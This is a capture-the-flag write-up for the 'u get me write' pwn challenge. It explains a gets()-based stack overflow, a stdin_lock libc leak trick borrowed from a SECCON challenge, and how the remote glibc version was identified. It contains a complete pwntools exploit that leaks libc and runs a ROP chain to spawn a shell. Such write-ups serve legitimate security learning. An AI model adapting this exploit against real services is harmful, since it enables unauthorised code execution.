# u get me write

```
Surely one gets call wont get me fired right?
nc challenge.secso.cc 8004 
```

Solved by @Rosayxy.

This source code is surprisingly simple. 

```py
int __fastcall main(int argc, const char **argv, const char **envp)
{
  printf("Hello! %s\n", "Pleasure to meet you! Please enter your name: ");
  return gets();
}
```

this reminds me of something I've seen in seccon quals last year. As is posted in [my previous writeup](https://rosayxy.github.io/seccon-reflections/)

## Recap

In the `make ROP great again` challenge, the solution then is to use `gets` to cover the rdi to stdin_lock, and use some trick to read the leak the libc address which is written at the `stdin_lock + 8`

We use puts to print the address, then we reenter main and do a classic rop.

## This challenge

This challenge doesn't give the libc and linker, so we have to assume they are libc-2.39 (the trick above doesn't work in libc-2.35 sadly).

We can leak the libc address using the same trick, but when I try to do the `system("/bin/sh)` rop, it always crashes on remote.

I guess its the version of the libc-2.39 is not matching with the remote one. Therefore, to find out the remote version, I try to print the `version` string in the libc, which by my speculation will not be far from the local glibc2.39-0ubuntu8.1.

It turns out the version is `2.39-0ubuntu8.5`, so I download the libc, changed the address of `system`  and the gadgets and it works

## exp

```py
from pwn import *
context(log_level = "debug", arch = "amd64", os = "linux")
# p = process("./get-me-write")
p = remote("challenge.secso.cc", 8004)
libc = ELF("./libc.so.6")
gets_plt = 0x401060
puts_plt = 0x401050
main = 0x401156
p.recvuntil("Please enter your name: \n")
# gdb.attach(p)
# pause()
p.sendline(b"a"*0x28 + p64(0x040119B) +p64(gets_plt) + p64(gets_plt) + p64(puts_plt) + p64(main))
p.sendline(b"a"*8+p64(0))
sleep(0.1)
p.sendline("bbbb")
p.recvuntil("`aa")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
print(hex(libc_leak))
libc_base = libc_leak + 0x28c0
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))
pop_rdi = 0x10f75b + libc_base
print(hex(libc_base))
# gdb.attach(p)
# pause()
p.recvuntil("Please enter your name: \n")
p.sendline(b"a"*0x28 + p64(pop_rdi) + p64(binsh)+ p64(system))
p.interactive()
```

## comments

Personally, I think this challenge is NOT SO GREAT, because **IN THE ORIGINAL SECCON CHALLENGE, YOU NEED TO READ THE SOURCE CODE TO KNOW WHAT GETS IS DOING, AND HOW YOU CAN TRICK THE STDIN LOCK**. However, the libc version is not given here, so you might not know what to do if you didn't play seccon quals last year or didn't gooogle the `make ROP great again` challenge.
